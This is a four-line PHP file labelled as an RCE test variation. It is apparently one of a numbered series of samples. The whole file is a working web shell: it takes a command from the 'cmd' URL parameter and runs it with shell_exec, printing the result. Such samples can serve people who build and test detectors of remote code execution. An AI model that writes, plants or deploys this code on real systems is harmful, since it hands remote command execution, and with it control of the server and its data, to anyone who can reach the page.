<?php
// RCE test variation #50
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>